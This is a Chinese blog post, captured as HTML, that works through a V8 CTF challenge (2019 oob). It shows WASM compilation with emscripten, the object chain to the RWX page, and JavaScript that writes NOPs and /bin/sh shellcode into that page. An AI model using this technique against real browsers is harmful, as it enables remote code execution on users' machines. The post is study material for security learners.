@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="主要参考blog：传送门 备注：上一篇blog中提到的指针压缩是v8沙箱的重要实现方式，可以避免对象的内存错误溢出到其他重要内存空间。对沙箱的逃逸也是当前漏洞利用的关键，不是那么容易实现的。  D. Utilize WASM 在上面的blog中，除了普通的pwn利用方式外，还给出了一种通过WebAssembly进行利用的方式。 WASM，简单来说，就是将C&#x2F;C++这种编译语言编译成一种机器码，然后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="chrome v8 pwn 学习 (3)">
+<meta property="og:url" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/index.html">
+<meta property="og:site_name" content="CoLin&#39;s BLOG">
+<meta property="og:description" content="主要参考blog：传送门 备注：上一篇blog中提到的指针压缩是v8沙箱的重要实现方式，可以避免对象的内存错误溢出到其他重要内存空间。对沙箱的逃逸也是当前漏洞利用的关键，不是那么容易实现的。  D. Utilize WASM 在上面的blog中，除了普通的pwn利用方式外，还给出了一种通过WebAssembly进行利用的方式。 WASM，简单来说，就是将C&#x2F;C++这种编译语言编译成一种机器码，然后">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/1.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/2.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/3.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/4.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/5.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/6.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/7.png">
+<meta property="article:published_time" content="2024-12-17T08:42:27.000Z">
+<meta property="article:modified_time" content="2024-12-17T08:42:56.952Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/1.png">
+
+<link rel="canonical" href="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>chrome v8 pwn 学习 (3) | CoLin's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's BLOG</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          chrome v8 pwn 学习 (3)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-12-17 16:42:27 / 修改时间：16:42:56" itemprop="dateCreated datePublished" datetime="2024-12-17T16:42:27+08:00">2024-12-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/v8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">v8系列</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>主要参考blog：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">传送门</a></p>
+<p>备注：上一篇blog中提到的指针压缩是v8沙箱的重要实现方式，可以避免对象的内存错误溢出到其他重要内存空间。对沙箱的逃逸也是当前漏洞利用的关键，不是那么容易实现的。</p>
+<h1 id="d-utilize-wasm"><a class="markdownIt-Anchor" href="#d-utilize-wasm"></a> D. Utilize WASM</h1>
+<p>在上面的blog中，除了普通的pwn利用方式外，还给出了一种通过WebAssembly进行利用的方式。</p>
+<p>WASM，简单来说，就是将C/C++这种编译语言编译成一种机器码，然后由v8来解释执行它。这个机器码本质上是一种字节码，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/detectiveHLH/p/9928915.html">资料</a>。我们首先安装一下相关包测试一下它的效果。</p>
+<h2 id="d1-installation-trial"><a class="markdownIt-Anchor" href="#d1-installation-trial"></a> D.1 Installation &amp;&amp; Trial</h2>
+<p>这里选择安装emscripten，这是一个基于LLVM的WASM完整编译链，按照<a target="_blank" rel="noopener" href="https://emscripten.org/docs/getting_started/downloads.html">官方文档</a>中的指引进行安装即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the emsdk repo</span></span><br><span class="line">git clone https://github.com/emscripten-core/emsdk.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enter that directory</span></span><br><span class="line">cd emsdk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Download and install the latest SDK tools.</span></span><br><span class="line">./emsdk install latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Make the <span class="string">&quot;latest&quot;</span> SDK <span class="string">&quot;active&quot;</span> <span class="keyword">for</span> the current user. (writes .emscripten file)</span></span><br><span class="line">./emsdk activate latest</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Activate PATH and other environment variables <span class="keyword">in</span> the current terminal</span></span><br><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure>
+<p>安装完成后，我们编写一个Demo C程序并用emscripten处理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用下面的命令编译为WASM：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.js</span><br></pre></td></tr></table></figure>
+<p>它的输出由两个文件组成，一个是JS文件demo.js，另一个是WASM文件demo.wasm。这个demo.js可以通过node直接执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node demo.js</span><br></pre></td></tr></table></figure>
+<p>另外还可以创建HTML文件，将上面的编译命令的输出结果后缀替换为html即可，这样可以在浏览器打开html文件时执行WASM。</p>
+<p>我们再安装一个反编译WASM的工具，帮助我们拆解WASM的执行逻辑。这里安装<a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt">WABT</a>。按照Github README进行编译安装即可。</p>
+<p>添加了环境变量后，可以使用下面的命令将WASM转换为WAT格式，WAT格式是文本格式，可以理解为WASM的汇编代码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2wat demo.wasm &gt; demo.wat</span><br></pre></td></tr></table></figure>
+<p>WABT甚至支持将WASM直接转换为C代码，但最终的效果就像用IDA Pro反汇编出来的C代码一样，可读性有但不多。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2c demo.wasm &gt; demo_rev.c</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，我们并不能直接读取该WASM文件并在d8中直接执行。因为d8中只能执行WASM字节码片段，就像我们在C语言中想要执行一段shellcode一样，这里输出的WASM文件可以对应于完整的ELF文件。将ELF文件从头开始作为shellcode执行当然不可行，因此将WASM文件从头开始在d8中执行同样不可行。那么我们应该对其进行什么处理，才能让d8能够成功执行呢？</p>
+<p>执行下面的命令即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.html -s WASM=1 -Os -g2</span><br></pre></td></tr></table></figure>
+<p>这里的<code>-Os</code>表示优化等级，<code>-g2</code>表示调试等级，如果这里不加调试等级，那么导出的符号<code>a</code>、<code>b</code>、<code>c</code>我们可能不方便对应于main，不利于我们后续运行。输出WASM文件用wasm2wat命令解析结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(module $demo.wasm</span><br><span class="line">  (type (;0;) (func (param i32 i32) (result i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (func $main (type 0) (param i32 i32) (result i32)</span><br><span class="line">    i32.const 42)</span><br><span class="line">  (func $__wasm_call_ctors (type 1))</span><br><span class="line">  (table (;0;) 1 1 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (export &quot;a&quot; (memory 0))</span><br><span class="line">  (export &quot;b&quot; (func $__wasm_call_ctors))</span><br><span class="line">  (export &quot;c&quot; (func $main))</span><br><span class="line">  (export &quot;d&quot; (table 0)))</span><br></pre></td></tr></table></figure>
+<p>这里最重要的是需要将输出设置为HTML格式，并设置WASM选项为1。这样会输出一个HTML文件和一个WASM文件，而WASM文件中基本仅会保存main函数的逻辑，且会将main函数作为导出函数，可以在d8中调用。如果使用下面的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.wasm -Os</span><br></pre></td></tr></table></figure>
+<p>虽然也可以输出WASM文件，但我们无法将其直接加载到d8中进行执行，因为其中包含外部符号（即下面的<code>wasi_snapshot_preview1</code>和<code>proc_exit</code>），而外部符号在d8中是不允许使用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(module $demo.wasm</span><br><span class="line">  (type (;0;) (func (param i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (type (;2;) (func (result i32)))</span><br><span class="line">  (import &quot;wasi_snapshot_preview1&quot; &quot;proc_exit&quot; (func $__wasi_proc_exit (type 0)))</span><br><span class="line">  (func $__wasm_call_ctors (type 1)</span><br><span class="line">    nop)</span><br><span class="line">  (func $_start (type 1)</span><br><span class="line">    i32.const 42</span><br><span class="line">    call $__wasi_proc_exit</span><br><span class="line">    unreachable)</span><br><span class="line">  (func $_emscripten_stack_restore (type 0) (param i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    global.set $__stack_pointer)</span><br><span class="line">  (func $emscripten_stack_get_current (type 2) (result i32)</span><br><span class="line">    global.get $__stack_pointer)</span><br><span class="line">  (table (;0;) 2 2 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (global $__stack_pointer (mut i32) (i32.const 66560))</span><br><span class="line">  (export &quot;memory&quot; (memory 0))</span><br><span class="line">  (export &quot;__indirect_function_table&quot; (table 0))</span><br><span class="line">  (export &quot;_start&quot; (func $_start))</span><br><span class="line">  (export &quot;_emscripten_stack_restore&quot; (func $_emscripten_stack_restore))</span><br><span class="line">  (export &quot;emscripten_stack_get_current&quot; (func $emscripten_stack_get_current))</span><br><span class="line">  (elem (;0;) (i32.const 1) func $__wasm_call_ctors))</span><br></pre></td></tr></table></figure>
+<p>如果执行包含外部导入符号，d8会产生报错，因此同样的，我们无法在WASM中编写如<code>printf(&quot;Hello world&quot;);</code>这样的语句，因为<code>printf</code>是导入符号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test_wasm.js:15: TypeError: WebAssembly.Instance(): Import #0 module=&quot;wasi_snapshot_preview1&quot; error: module is not an object or function</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">                   ^</span><br><span class="line">TypeError: WebAssembly.Instance(): Import #0 module=&quot;wasi_snapshot_preview1&quot; error: module is not an object or function</span><br><span class="line">    at ./test_wasm.js:15:20</span><br></pre></td></tr></table></figure>
+<p>在上面使用正确命令获取的WASM代码中，可以看到<code>main</code>函数是以<code>c</code>作为导出符号的，那么我们需要在d8中调用c这个导出符号：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] return value from wasm: &quot;</span> + d);</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/misc/CTF-problems/2019CTF-masterctf_oob/Chrome » ./v8/v8/out/x64.debug/d8 --allow-natives-syntax ./test_wasm.js</span><br><span class="line">[*] return from wasm: 42</span><br></pre></td></tr></table></figure>
+<p>JS代码的第一行是读取demo.wasm文件并将其转换为8位无符号整数类型。后面则是创建WASM模块于WASM执行实例。通过<code>wasmInstance.exports.xxx</code>获取某个WASM文件导出符号，这里获取的是<code>c</code>，也就是<code>main</code>函数的导出符号，这个导出符号是一个函数，下面可以直接以函数调用的形式执行WASM文件中的<code>main</code>函数，执行的返回值即为<code>main</code>函数的返回值。</p>
+<h2 id="d2-wasm-code-path"><a class="markdownIt-Anchor" href="#d2-wasm-code-path"></a> D.2 WASM Code Path</h2>
+<p>上面我们已经能够成功进行WASM的导入和执行，那么下面我们需要简单理解一下WASM的执行流程。</p>
+<p>考虑下面的代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br></pre></td></tr></table></figure>
+<p>WASM文件就使用上面的那个返回42的简单代码。</p>
+<p><img src="1.png" alt="" /></p>
+<p>在断点处查看内存布局，可以发现一个RWX权限的页，</p>
+<p><img src="2.png" alt="" /></p>
+<p>经过简单查找之后，我们就可以发现WASM代码转换得到的x64汇编代码。可见在我们能够进行任意地址读写后，可以通过修改这里直接执行shellcode。</p>
+<p>那么，我们应该通过什么地址链找到这里呢。本文的主要blog提供了一条链子：</p>
+<h3 id="a-functionshared_info-offset-0x18"><a class="markdownIt-Anchor" href="#a-functionshared_info-offset-0x18"></a> A. Function.shared_info (offset 0x18)</h3>
+<p>这里的Function就是上面脚本中的f。</p>
+<p><img src="3.png" alt="" /></p>
+<h3 id="b-sharedfunctioninfodata-offset-8"><a class="markdownIt-Anchor" href="#b-sharedfunctioninfodata-offset-8"></a> B. SharedFunctionInfo.data (offset 8)</h3>
+<p><img src="4.png" alt="" /></p>
+<h3 id="c-wasmexportedfunctiondatainstance-offset-0x10"><a class="markdownIt-Anchor" href="#c-wasmexportedfunctiondatainstance-offset-0x10"></a> C. WasmExportedFunctionData.instance (offset 0x10)</h3>
+<p><img src="5.png" alt="" /></p>
+<h3 id="d-wasminstanceobject-0x88"><a class="markdownIt-Anchor" href="#d-wasminstanceobject-0x88"></a> D. WasmInstanceObject + 0x88</h3>
+<p><img src="6.png" alt="" /></p>
+<p>这样我们就可以找到RWX的内存页的首地址。实际上我们找到这里就可以了，不用管页内偏移具体是多少，因为我们可以直接用nop指令填充该页的绝大部分，然后在后面附加shellcode即可。</p>
+<h2 id="d3-chrome-v8-double-kill"><a class="markdownIt-Anchor" href="#d3-chrome-v8-double-kill"></a> D.3 Chrome v8 Double Kill</h2>
+<p>我们尝试将寻找RWX页的内存地址的实现代码添加到上一篇blog中实现的exp脚本后面：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Load WASM code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Get RWX page start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">get_object_address</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_function_info_addr = <span class="title function_">read_at</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function_data_addr = <span class="title function_">read_at</span>(shared_function_info_addr + <span class="number">0x8n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_object_addr = <span class="title function_">read_at</span>(wasm_exported_function_data_addr + <span class="number">0x10n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_start = <span class="title function_">read_at</span>(wasm_instance_object_addr + <span class="number">0x88n</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Got RWX page start: 0x&quot;</span> + rwx_page_start.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+<p>然后加上nop指令填充：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Fill most of the page with nop instructions</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> off=<span class="number">0</span>; off &lt;= <span class="number">0xEF8</span>; off++) &#123;</span><br><span class="line">    <span class="title function_">write_at</span>(rwx_page_start + <span class="title class_">BigInt</span>(off), <span class="number">0x9090909090909090n</span>);    <span class="comment">// nop: 0x90</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编写下面的简单Python脚本获取shellcode字节序列：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">asm_bytes = asm(shellcraft.amd64.sh())</span><br><span class="line"></span><br><span class="line">asm_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> asm_bytes:</span><br><span class="line">    asm_list.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm_list)</span><br></pre></td></tr></table></figure>
+<p>字节序列为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]</span><br></pre></td></tr></table></figure>
